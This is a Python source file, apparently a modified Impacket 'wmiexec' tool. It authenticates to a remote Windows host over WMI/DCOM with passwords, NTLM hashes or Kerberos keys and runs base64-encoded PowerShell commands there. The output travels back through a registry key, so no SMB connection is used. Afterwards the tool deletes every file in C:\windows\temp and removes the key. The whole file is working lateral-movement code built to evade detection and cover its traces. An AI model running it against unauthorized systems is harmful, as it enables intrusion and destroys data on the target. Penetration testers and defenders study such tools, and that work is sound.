'''
wmiexec-reg

execute command in target (do not connect to smb server)-- done

write command result into C:\windows\temp to registry

query result

HKEY_CLASSES_ROOT = -2147483648
HKEY_CURRENT_USER = -2147483649
HKEY_LOCAL_MACHINE = -2147483650
HKEY_USERS = -2147483651
HKEY_CURRENT_CONFIG = -2147483653
'''

from __future__ import division
from __future__ import print_function
import re
import sys
import os
import cmd
import argparse
import time
import logging
import ntpath
from base64 import b64encode

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5 import transport, rrp, scmr, rpcrt
from impacket.system_errors import ERROR_NO_MORE_ITEMS
from impacket.structure import hexdump
from six import PY2
import uuid
import base64

OUTPUT_FILENAME = '__' + str(time.time())
CODEC = sys.stdout.encoding

class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None,
                doKerberos=False, kdcHost=None, shell_type=None):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell( win32Process, self.__shell_type, iWbemServices)
            if self.__command != ' ':
                self.shell.onecmd(self.__command)
            else:
                print("[-] give me command that you want")
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)
        
        dcom.disconnect()

class RemoteShell(cmd.Cmd):
    def __init__(self, win32Process, shell_type, iWbemServices):
        cmd.Cmd.__init__(self)
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        #self.__shell = 'cmd.exe /Q /c '
        self.__shell = 'cmd.exe /Q /c '
        self.__shell_type = shell_type
        #self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__pwsh = 'powershell.exe -Enc '
        self.__win32Process = win32Process
        self.iWbemServices = iWbemServices
        self.__pwd = str('C:\\')

    def do_EOF(self, s):
        print()
        return self.do_exit(s)

    def emptyline(self):
        return False

    def default(self, line):
        if line != '':
            self.send_data(line)
        else:
            print("[-] give me command that you want")

    def encodeCommand(self, data):
        data = '$ProgressPreference="SilentlyContinue";' + data
        #print(data)
        data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
        return data

    def execute_remote(self, data, shell_type='powershell'):
        if shell_type == 'powershell':
            #Save result as txt file
            resultTXT = "C:\\windows\\temp\\" + str(uuid.uuid4()) + ".txt"
            print("[+] Executing command: \" %s \""%data)
            data = data + " > " + resultTXT
            command = self.__shell + self.encodeCommand(data)
            self.__win32Process.Create(command, self.__pwd, None)
            print("[+] Wait a second for command executed finish")
            time.sleep(5)
            #Convert result to base64 strings
            print("[+] Save file to: " + resultTXT)
            print("[+] Encoded file to base64 format")
            keyName = str(uuid.uuid4())
            data = """[convert]::ToBase64String((Get-Content -path %s -Encoding byte)) | set-content -path C:\\windows\\temp\\%s.txt -force | Out-Null"""%(resultTXT,keyName)
            command = self.__shell + self.encodeCommand(data)
            self.__win32Process.Create(command, self.__pwd, None)
            time.sleep(5)
            #Add base64 strings to registry
            registry_Path = "HKLM:\\Software\\Classes\\hello\\"
            print("[+] Adding base64 strings to registry, path: %s, keyname: %s"%(registry_Path,keyName))
            data = """New-Item %s -Force; New-ItemProperty -Path %s -Name %s -Value (get-content -path C:\\windows\\temp\\%s.txt) -PropertyType string -Force | Out-Null"""%(registry_Path,registry_Path,keyName,keyName)
            command = self.__shell + self.encodeCommand(data)
            self.__win32Process.Create(command, self.__pwd, None)
            time.sleep(1)
            #Remove temp file
            print("[+] Remove temporary files")
            data = ("del /q /f /s C:\\windows\\temp\\*")
            command = self.__shell + data
            self.__win32Process.Create(command, self.__pwd, None)
            #Query result through WQL syntax
            self.queryWQL(keyName)


    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        print("[+] Command done")

    def printReply(self, iEnum):
        printHeader = True
        while True:
            try:
                pEnum = iEnum.Next(0xffffffff,1)[0]
                record = pEnum.getProperties()
                if printHeader is True:
                    print('|', end=' ')
                    for col in record:
                        print('%s |' % col, end=' ')
                    print()
                    printHeader = False
                print('|', end=' ') 
                for key in record:
                    if type(record[key]['value']) is list:
                        for item in record[key]['value']:
                            print(item, end=' ')
                        print(' |', end=' ')
                    else:
                        print('%s |' % record[key]['value'], end=' ')
                print() 
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('S_FALSE') < 0:
                    raise
                else:
                    break
        iEnum.RemRelease() 

    def queryWQL(self, keyName):
        namespace = '//%s/root/default' % address
        descriptor, _ = self.iWbemServices.GetObject('StdRegProv')
        descriptor = descriptor.SpawnInstance()
        retVal = descriptor.GetStringValue(2147483650,'SOFTWARE\\classes\\hello', keyName)
        print("[+] Get result:")
        result = retVal.sValue
        print(base64.b64decode(result).decode('utf-16le'))
        print("[+] Remove registry Key")
        retVal = descriptor.DeleteKey(2147483650,'SOFTWARE\\classes\\hello')
        descriptor.RemRelease()
        self.iWbemServices.RemRelease()

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Executes a semi-interactive shell using Windows "
                                                                "Management Instrumentation.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-shell-type', action='store', default='powershell', choices=['cmd', 'powershell'],
                        help='choose a command processor for the semi-interactive shell')
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION",
                        help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('command', nargs='*', default=' ', help='command to execute at the target. If empty it will '
                                                                'launch a semi-interactive shell')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    domain, username, password, address = parse_target(options.target)

    try:

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        executer = WMIEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey
                           ,options.k, options.dc_ip, options.shell_type)
        executer.run(address)
    except KeyboardInterrupt as e:
        logging.error(str(e))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))
        sys.exit(1)

    sys.exit(0)
